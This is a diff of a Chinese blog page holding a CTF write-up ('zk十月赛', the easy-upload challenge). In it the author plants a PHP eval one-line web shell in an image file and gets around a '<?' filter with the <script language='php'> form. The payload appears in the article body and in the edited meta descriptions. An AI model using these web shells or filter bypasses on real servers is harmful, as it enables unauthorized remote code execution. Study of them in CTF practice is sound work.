@@ -9,13 +9,13 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="easy-upload打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马 12一句话木马：&amp;lt;?php @eval($_POST[&amp;apos;pass&amp;apos;]);?&amp;gt; 再次上传，得到提示不能有”&amp;lt;?”使用123&amp;lt;script language=&amp;q">
+  <meta name="description" content="zk十月赛">
 <meta name="keywords" content="zkctf,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="zk十月赛">
 <meta property="og:url" content="http://yoursite.com/2019/10/24/zk十月赛/index.html">
 <meta property="og:site_name" content="美豆的博客">
-<meta property="og:description" content="easy-upload打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马 12一句话木马：&amp;lt;?php @eval($_POST[&amp;apos;pass&amp;apos;]);?&amp;gt; 再次上传，得到提示不能有”&amp;lt;?”使用123&amp;lt;script language=&amp;q">
+<meta property="og:description" content="zk十月赛">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/24/Kae5id.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/24/KamMy6.png">
@@ -23,10 +23,10 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/24/Kam7tJ.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/24/KaZ7bF.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/24/KamykQ.png">
-<meta property="og:updated_time" content="2019-10-24T13:52:22.790Z">
+<meta property="og:updated_time" content="2019-11-05T14:21:22.229Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="zk十月赛">
-<meta name="twitter:description" content="easy-upload打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马 12一句话木马：&amp;lt;?php @eval($_POST[&amp;apos;pass&amp;apos;]);?&amp;gt; 再次上传，得到提示不能有”&amp;lt;?”使用123&amp;lt;script language=&amp;q">
+<meta name="twitter:description" content="zk十月赛">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/10/24/Kae5id.png">
   
     <link rel="alternative" href="/atom.xml" title="美豆的博客" type="application/atom+xml">
@@ -231,7 +231,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h1><p>打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马<br><img src="https://s2.ax1x.com/2019/10/24/Kae5id.png" alt="1"></p>
+        <p>zk十月赛<br><a id="more"></a></p>
+<h1 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h1><p>打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马<br><img src="https://s2.ax1x.com/2019/10/24/Kae5id.png" alt="1"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一句话木马：</span><br><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>再次上传，得到提示不能有”&lt;?”<br><img src="https://s2.ax1x.com/2019/10/24/KamMy6.png" alt="2"><br>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">@eval($_POST[&apos;mc&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>绕过&lt;?的限制，再次上传，上传成功，并得到上传后的文件名。</p>
